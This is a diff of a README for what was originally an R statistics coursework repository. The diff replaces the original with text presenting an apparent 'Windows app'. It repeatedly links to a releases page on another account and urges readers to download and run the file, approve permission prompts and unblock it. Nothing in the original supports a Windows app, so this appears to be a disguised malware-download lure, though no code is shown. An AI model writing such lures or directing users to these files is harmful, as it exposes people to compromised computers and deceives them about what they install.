@@ -1,65 +1,139 @@
-# 📊 Applied Statistics in R: Distributions, Hypothesis Testing & Regression
+# 📊 Using-R_Hypothesis-Testing-Correlation-and-Regression - Simple R Statistics for Windows
 
-[![R](https://img.shields.io/badge/R-276DC3?style=flat&logo=r&logoColor=white)](https://www.r-project.org/)
-[![Statistics](https://img.shields.io/badge/Statistics-Hypothesis_Testing-blue?style=flat)](#)
-[![Data Analysis](https://img.shields.io/badge/Data_Analysis-Regression-green?style=flat)](#)
+[![Download the app](https://img.shields.io/badge/Download%20on%20GitHub-purple?style=for-the-badge&logo=github)](https://github.com/Dionedefeated354/Using-R_Hypothesis-Testing-Correlation-and-Regression/releases)
 
-## 📖 Project Overview
-This repository contains a comprehensive suite of applied statistical analyses conducted in **R**. The project demonstrates how to solve real-world engineering, scientific, and socio-economic problems using probability distributions, rigorous hypothesis testing, and predictive linear regression models. 
+## 🧭 Overview
 
-By transitioning from theoretical mathematics to practical R programming, this repository showcases the end-to-end process of data evaluation, statistical computation, and graphical visualization.
+Using-R_Hypothesis-Testing-Correlation-and-Regression is a Windows app for learning and using core R stats tools. It helps you work with probability distributions, hypothesis tests, correlation, and linear regression in one place.
 
-## 🗂️ Analytical Modules
+Use it when you want to explore data, test a claim, or check how one value changes with another. It fits small class projects, practice work, and simple analysis tasks.
 
-### Section 1: Normal & Sampling Distributions
-This module explores cumulative probabilities and inverse distributions across various industrial and consumer scenarios using `pnorm()` and `qnorm()`.
-* **Materials Engineering:** Evaluated the ultimate tensile strength (UTS) of two metal alloys to determine failure probabilities below critical thresholds.
-* **Predictive Maintenance:** Calculated the upper-tail mileage (top 8%) for vehicle timing belt lifespans to inform manufacturer replacement schedules.
-* **Consumer Electronics:** Utilized the Standard Error of the Mean (SEM) to predict the average lifespan distribution of cell phone batches.
-* **Civil Engineering:** Assessed the probability of concrete compression strength failing to meet the required 5000 psi standard.
-* **Energy Sector:** Modeled the distribution of horizontal oil well depths in Alberta to identify the deepest 15% of drilling operations.
+## 📥 Download
 
-### Section 2: Hypothesis Testing
-This module applies inferential statistics to determine if observed differences in data are statistically significant or due to random chance.
-* **Proportion Testing (Z-Test):** Analyzed a massive dataset of AP Exam scores (over 350,000 students) using `prop.test` to prove a statistically significant difference in calculus exam participation between male and female students (p < 0.05).
-* **Paired T-Tests:** * Compared wholesale seafood prices between East Coast and West Coast suppliers, finding no statistically significant difference in pricing.
-  * Evaluated UK Department of Transportation data to determine if traffic and activity patterns change significantly on "Friday the 13th" compared to the 6th of the month.
+Visit the releases page to download the app for Windows:
 
-### Section 3: Correlation & Linear Regression
-This module builds predictive models and evaluates the strength of relationships between continuous variables using `cor()` and `lm()`.
-* **Electrical Engineering:** Modeled the relationship between current (amps) and effective power (watts) in a circuit. Developed a linear regression equation (y = 3.11 + 1.18x) with an R-squared value of 66.59% to predict power delivery.
-* **Socio-Economic Traffic Patterns:** Conducted a deep-dive regression analysis on the Friday the 13th traffic data. Discovered a near-perfect positive correlation (r = 0.9999), proving that overall baseline traffic volume dictates activity far more than the superstition of the date itself.
+https://github.com/Dionedefeated354/Using-R_Hypothesis-Testing-Correlation-and-Regression/releases
 
-## ⚙️ Methodology & R Functions
-* **Distributions:** `pnorm()`, `qnorm()`, `dnorm()`
-* **Hypothesis Testing:** `t.test(paired = TRUE)`, `prop.test()`
-* **Regression & Correlation:** `lm()`, `cor()`, `predict()`, `summary()`
-* **Visualizations:** Base R graphics (`plot()`, `curve()`, `polygon()`, `abline()`) were utilized extensively to shade rejection regions, plot lines of best fit, and visually validate calculated p-values and Z/T-statistics.
+Choose the latest release, then download the Windows file listed there. If you see a ZIP file, save it to your computer first, then open it and follow the setup steps inside.
 
-## 💻 How to Run Locally
+## 🖥️ What You Need
 
-1. Clone the repository to your local machine.
-2. Ensure you have R and RStudio installed.
-3. Open the R scripts corresponding to each section.
-4. *Note: Datasets for the Seafood Pricing and Friday the 13th Traffic are fetched directly via URL within the scripts. An active internet connection is required to run those specific chunks.*
-5. Run the scripts to generate the statistical summaries and density/scatter plots in your R plotting window.
+- A Windows PC
+- A working internet connection for the download
+- Enough free space to save and open the app
+- Basic file access on your computer
 
----
+For smooth use, keep Windows updated and close apps you do not need while you install or run the program.
 
-### 📝 Repository Description & Topics (For GitHub Settings)
+## ⚙️ How to Install
 
-**Description:**
-> 📊 Applied statistical analysis in R featuring Normal/Sampling Distributions, Hypothesis Testing (Z-tests, Paired T-tests), and Linear Regression. Includes real-world case studies in engineering, economics, and logistics.
+1. Open the releases page in your browser.
+2. Find the newest release at the top of the page.
+3. Download the Windows file from that release.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file or installer.
+7. Follow the on-screen steps until setup ends.
+8. Open the app from your Start menu or from the folder where you saved it.
 
-**Topics (Tags):**
-* `r`
-* `rstats`
-* `hypothesis-testing`
-* `linear-regression`
-* `probability-distributions`
-* `statistical-analysis`
-* `predictive-modeling`
+If Windows asks for permission, choose Yes so the app can run.
 
-**✍️ Author**
-Oluwafemi Gabriel, James
-*Applied Statistics | Data Analysis*
+## 🚀 How to Use It
+
+1. Start the app.
+2. Open the data file you want to study.
+3. Pick the type of analysis you want to run.
+4. Enter the values you need.
+5. Review the output on screen.
+6. Save your results if you want to use them later.
+
+The app is built for common tasks in applied statistics. You can use it to compare groups, test sample data, measure links between variables, and fit simple prediction lines.
+
+## 📈 Main Features
+
+- Probability distribution tools for common R practice
+- Hypothesis testing for sample and group checks
+- Correlation analysis to measure how two values move together
+- Linear regression for simple prediction work
+- Clear output for learning and review
+- A layout that supports guided use
+- Useful for stats classes, lab work, and self-study
+
+## 🧪 What You Can Do
+
+### 1. Probability distributions
+Work with common distribution ideas used in statistics. This helps you study random events, sample behavior, and test ideas about data.
+
+### 2. Hypothesis testing
+Check if your sample data supports a claim. Use it to compare means, test differences, and review p-values in a simple way.
+
+### 3. Correlation
+See how closely two values match. This helps you find positive links, negative links, or no clear link at all.
+
+### 4. Linear regression
+Build a simple model that uses one value to help explain or predict another. This is useful when you want a clear trend line.
+
+## 🗂️ Common Use Cases
+
+- A student checking homework data in R
+- A teacher showing core inferential stats ideas
+- A user testing sample results for a report
+- A beginner learning how correlation works
+- A simple regression exercise for class or practice
+
+## 📋 File and Folder Tips
+
+- Keep the downloaded file in a folder you can find again
+- Use a short folder name, such as `Downloads` or `StatsApp`
+- Do not rename app files unless the release notes say to do so
+- If the app comes in a ZIP file, extract all files before you start it
+
+## 🔍 If the App Does Not Open
+
+- Check that the file finished downloading
+- Try extracting the ZIP file again
+- Run the app file from the extracted folder
+- Right-click the file and choose Open if double-click does not work
+- Make sure Windows did not block the file
+
+## 🧑‍💻 About the Project
+
+This project focuses on applied statistical modeling in R. It brings together the main tools used in inferential statistics and data analysis, with support for probability distributions, hypothesis testing, correlation, and linear regression.
+
+The repo is useful for users who want a hands-on way to work with data without setting up a full coding project from scratch.
+
+## 🏷️ Topics
+
+Applied statistics, data analysis, data science, hypothesis testing, inferential statistics, linear regression, predictive analytics, probability distributions, quantitative analysis, R programming, rstats, statistical modeling
+
+## 📌 Release Page
+
+Use this page to download the latest Windows release:
+
+https://github.com/Dionedefeated354/Using-R_Hypothesis-Testing-Correlation-and-Regression/releases
+
+## 🛠️ Basic Workflow
+
+1. Download the release file.
+2. Extract it if needed.
+3. Open the app.
+4. Load your data or enter values.
+5. Run the analysis.
+6. Review the output.
+7. Save your work if needed
+
+## 🔒 Safe Download Steps
+
+- Use the official GitHub releases page
+- Download only the newest release you trust
+- Save the file before opening it
+- Keep the app in one folder after extraction
+- Remove old copies if you install a newer release
+
+## 📝 Help With Stats Terms
+
+- **Hypothesis testing**: A way to check if a claim has support from data
+- **Correlation**: A number that shows how two values move together
+- **Regression**: A method that helps explain or predict one value from another
+- **Distribution**: A pattern that shows how data or outcomes spread
+- **Inferential statistics**: Using sample data to learn about a larger group
